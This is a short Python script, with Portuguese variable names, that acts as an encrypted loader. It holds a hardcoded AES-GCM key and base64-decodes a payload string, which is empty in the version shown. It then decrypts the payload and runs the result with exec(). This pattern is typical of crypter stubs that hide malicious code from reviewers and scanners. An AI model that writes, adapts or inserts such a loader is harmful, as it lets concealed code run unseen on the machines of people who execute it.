import base64, os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

chave = b'^\x10\xb6\xc9\xb5\xd1\x0e\xc7;\xcb\xb8\x11\xcf\x9c|\xd2\x99\x11\x05\xa8\x10\x182x\x0f\x1d,\x8d\x86\x82\x13:'
payload_b64 = ""

payload = base64.b64decode(payload_b64)
nonce = payload[:12]
dados_criptografados = payload[12:]

aesgcm = AESGCM(chave)
codigo = aesgcm.decrypt(nonce, dados_criptografados, None)
exec(codigo.decode())
